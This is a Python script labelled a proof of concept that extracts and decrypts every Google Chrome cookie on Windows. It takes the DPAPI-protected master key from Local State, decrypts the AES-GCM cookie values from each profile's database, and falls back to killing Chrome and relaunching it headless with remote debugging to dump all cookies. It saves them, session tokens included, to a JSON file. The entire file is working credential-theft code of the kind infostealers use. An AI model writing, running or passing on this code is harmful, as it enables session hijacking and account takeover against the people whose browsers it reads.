#!/usr/bin/env python3
import os
import json
import base64
import time
import subprocess
import socket
import pathlib
import tempfile
import shutil
import platform
import random
import sqlite3
from typing import List, Dict, Any, Optional, Tuple
import websocket
import requests
from Crypto.Cipher import AES
import win32crypt
import psutil

# Debug port for Chrome remote debugging protocol
DEBUG_PORT = 9222

class CookieEntry:
    def __init__(self, cookie_dict):
        self.host_key = cookie_dict.get("host_key", "")
        self.name = cookie_dict.get("name", "")
        self.path = cookie_dict.get("path", "")
        self.value = cookie_dict.get("value", "")
        self.expires_utc = cookie_dict.get("expires_utc", 0)
        self.is_secure = cookie_dict.get("is_secure", False)
        self.is_httponly = cookie_dict.get("is_httponly", False)
        self.creation_utc = cookie_dict.get("creation_utc", 0)
        self.last_access_utc = cookie_dict.get("last_access_utc", 0)
        self.has_expires = cookie_dict.get("has_expires", False)
        self.is_persistent = cookie_dict.get("is_persistent", False)
        self.priority = cookie_dict.get("priority", "medium")
        self.samesite = cookie_dict.get("samesite", "")
        self.source_scheme = cookie_dict.get("source_scheme", "")
        self.source_port = cookie_dict.get("source_port", 0)
        
    def to_dict(self):
        return {
            "host_key": self.host_key,
            "name": self.name,
            "path": self.path,
            "value": self.value,
            "expires_utc": self.expires_utc,
            "is_secure": self.is_secure,
            "is_httponly": self.is_httponly,
            "creation_utc": self.creation_utc,
            "last_access_utc": self.last_access_utc,
            "has_expires": self.has_expires,
            "is_persistent": self.is_persistent,
            "priority": self.priority,
            "samesite": self.samesite,
            "source_scheme": self.source_scheme,
            "source_port": self.source_port
        }

def get_chrome_user_data_dir() -> pathlib.Path:
    """Get the Chrome user data directory path based on the operating system"""
    if platform.system() == "Windows":
        return pathlib.Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data"
    elif platform.system() == "Darwin":  # macOS
        return pathlib.Path(os.environ["HOME"]) / "Library" / "Application Support" / "Google" / "Chrome"
    else:  # Linux
        return pathlib.Path(os.environ["HOME"]) / ".config" / "google-chrome"

def get_chrome_executable() -> pathlib.Path:
    """Get the Chrome executable path based on the operating system"""
    if platform.system() == "Windows":
        return pathlib.Path(os.environ["PROGRAMFILES"]) / "Google" / "Chrome" / "Application" / "chrome.exe"
    elif platform.system() == "Darwin":  # macOS
        return pathlib.Path("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome")
    else:  # Linux
        return pathlib.Path("/usr/bin/google-chrome")

def kill_chrome_processes():
    """Kill all running Chrome processes"""
    for proc in psutil.process_iter(['pid', 'name']):
        if 'chrome' in proc.info['name'].lower():
            try:
                proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    time.sleep(1)  # Give processes time to terminate

def start_chrome_with_debugging(chrome_exe: pathlib.Path, user_data_dir: pathlib.Path, profile: Optional[str] = None) -> subprocess.Popen:
    """Start Chrome with remote debugging enabled"""
    args = [
        str(chrome_exe),
        f"--remote-debugging-port={DEBUG_PORT}",
        "--remote-allow-origins=*",
        "--headless",
        f"--user-data-dir={user_data_dir}"
    ]
    
    if profile:
        args.append(f"--profile-directory={profile}")
    
    print(f"Starting Chrome with arguments: {' '.join(args)}")
    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def wait_for_debug_port(timeout: int = 10) -> bool:
    """Wait for Chrome's debug port to become available"""
    print(f"Waiting for debug port {DEBUG_PORT} to become available...")
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex(('127.0.0.1', DEBUG_PORT))
            sock.close()
            if result == 0:
                # Port is open, but wait a bit for Chrome to fully initialize
                time.sleep(1)
                return True
        except:
            pass
        time.sleep(0.5)
    return False

def get_debug_ws_url() -> str:
    """Get the WebSocket debugger URL from Chrome's debug endpoint"""
    try:
        response = requests.get(f"http://localhost:{DEBUG_PORT}/json")
        data = response.json()
        return data[0]["webSocketDebuggerUrl"]
    except Exception as e:
        raise Exception(f"Failed to get WebSocket debugger URL: {e}")

def get_all_cookies_via_debug(ws_url: str) -> List[Dict[str, Any]]:
    """Extract all cookies using Chrome's remote debugging protocol"""
    print(f"Connecting to WebSocket URL: {ws_url}")
    ws = websocket.create_connection(ws_url)
    
    # Request all cookies
    request = {
        "id": 1,
        "method": "Network.getAllCookies"
    }
    ws.send(json.dumps(request))
    
    # Get response
    response = ws.recv()
    ws.close()
    
    response_data = json.loads(response)
    if "result" in response_data and "cookies" in response_data["result"]:
        return response_data["result"]["cookies"]
    else:
        print(f"Unexpected response: {response_data}")
        return []

def get_encrypted_key_from_local_state(user_data_dir: pathlib.Path) -> bytes:
    """Get the encrypted key from Chrome's Local State file"""
    local_state_path = user_data_dir / "Local State"
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    
    encrypted_key = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key)
    
    # Remove 'DPAPI' prefix (first 5 bytes)
    return encrypted_key[5:]

def decrypt_with_dpapi(encrypted_data: bytes) -> bytes:
    """Decrypt data using Windows DPAPI"""
    return win32crypt.CryptUnprotectData(encrypted_data, None, None, None, 0)[1]

def get_master_key(user_data_dir: pathlib.Path) -> bytes:
    """Get the master key used for cookie encryption"""
    encrypted_key = get_encrypted_key_from_local_state(user_data_dir)
    return decrypt_with_dpapi(encrypted_key)

def decrypt_cookie_value(encrypted_value: bytes, master_key: bytes) -> str:
    """Decrypt an encrypted cookie value using the master key"""
    if not encrypted_value:
        return ""
    
    # Check if the value is actually encrypted
    if encrypted_value[:3] in (b'v10', b'v11'):
        # Extract nonce and ciphertext
        nonce = encrypted_value[3:3+12]
        ciphertext = encrypted_value[3+12:]
        
        # Create the cipher
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        
        # Decrypt
        try:
            decrypted = cipher.decrypt(ciphertext)
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"Failed to decrypt: {e}")
            return ""
    else:
        # Try DPAPI directly for older versions
        try:
            return decrypt_with_dpapi(encrypted_value).decode('utf-8')
        except Exception as e:
            print(f"Failed to decrypt with DPAPI: {e}")
            return ""

def extract_db_cookies(user_data_dir: pathlib.Path, profile: str, master_key: bytes) -> List[CookieEntry]:
    """Extract cookies from the SQLite database"""
    cookies_db_path = user_data_dir / profile / "Network" / "Cookies"
    
    # Create a temporary copy of the database to avoid lock issues
    temp_dir = tempfile.mkdtemp()
    temp_db_path = os.path.join(temp_dir, "Cookies.db")
    
    try:
        shutil.copy2(cookies_db_path, temp_db_path)
        
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        
        # Query all cookies
        cursor.execute(
            "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, "
            "is_httponly, creation_utc, last_access_utc, has_expires, is_persistent, "
            "priority, samesite, source_scheme, source_port "
            "FROM cookies"
        )
        
        cookies = []
        for row in cursor.fetchall():
            host_key, name, path, encrypted_value, expires_utc, is_secure, \
            is_httponly, creation_utc, last_access_utc, has_expires, is_persistent, \
            priority, samesite, source_scheme, source_port = row
            
            # Decrypt the cookie value
            decrypted_value = decrypt_cookie_value(encrypted_value, master_key)
            
            cookie = CookieEntry({
                "host_key": host_key,
                "name": name,
                "path": path,
                "value": decrypted_value,
                "expires_utc": expires_utc,
                "is_secure": bool(is_secure),
                "is_httponly": bool(is_httponly),
                "creation_utc": creation_utc,
                "last_access_utc": last_access_utc,
                "has_expires": bool(has_expires),
                "is_persistent": bool(is_persistent),
                "priority": priority,
                "samesite": samesite,
                "source_scheme": source_scheme,
                "source_port": source_port
            })
            
            cookies.append(cookie)
        
        cursor.close()
        conn.close()
        return cookies
    
    except Exception as e:
        print(f"Failed to extract cookies from database: {e}")
        return []
    
    finally:
        # Clean up the temporary directory
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def extract_cookies_from_profiles(user_data_dir: pathlib.Path) -> Dict[str, List[Dict[str, Any]]]:
    """Extract cookies from all Chrome profiles"""
    master_key = get_master_key(user_data_dir)
    
    # Get all profile directories
    profiles = {}
    for item in os.listdir(user_data_dir):
        profile_dir = user_data_dir / item
        if profile_dir.is_dir() and (profile_dir / "Network" / "Cookies").exists():
            if item == "Default":
                profiles["Default"] = item
            elif item.startswith("Profile "):
                profiles[item] = item
    
    # Extract cookies from each profile
    result = {}
    for profile_name, profile_dir in profiles.items():
        print(f"Extracting cookies from profile: {profile_name}")
        try:
            # Try database extraction first
            db_cookies = extract_db_cookies(user_data_dir, profile_dir, master_key)
            
            if db_cookies:
                result[profile_name] = [cookie.to_dict() for cookie in db_cookies]
            else:
                # Fall back to debug protocol if database extraction fails
                chrome_process = None
                try:
                    kill_chrome_processes()
                    chrome_exe = get_chrome_executable()
                    chrome_process = start_chrome_with_debugging(chrome_exe, user_data_dir, profile_dir)
                    
                    if wait_for_debug_port():
                        ws_url = get_debug_ws_url()
                        debug_cookies = get_all_cookies_via_debug(ws_url)
                        result[profile_name] = debug_cookies
                    else:
                        print(f"Failed to connect to debug port for profile {profile_name}")
                finally:
                    if chrome_process:
                        chrome_process.terminate()
                        time.sleep(1)
        except Exception as e:
            print(f"Error extracting cookies from profile {profile_name}: {e}")
    
    return result

def main():
    print("Chrome Cookie Extractor - Proof of Concept")
    print("-------------------------------------------")
    
    if platform.system() != "Windows":
        print("This script is currently designed for Windows only.")
        return
    
    user_data_dir = get_chrome_user_data_dir()
    print(f"Chrome user data directory: {user_data_dir}")
    
    # Extract cookies from all profiles
    all_cookies = extract_cookies_from_profiles(user_data_dir)
    
    # Write cookies to file
    with open("extracted_cookies.json", "w", encoding="utf-8") as f:
        json.dump(all_cookies, f, indent=2)
    
    print(f"Extracted cookies saved to extracted_cookies.json")
    
    # Count total cookies
    total_cookies = sum(len(cookies) for cookies in all_cookies.values())
    print(f"Total cookies extracted: {total_cookies}")

if __name__ == "__main__":
    main() 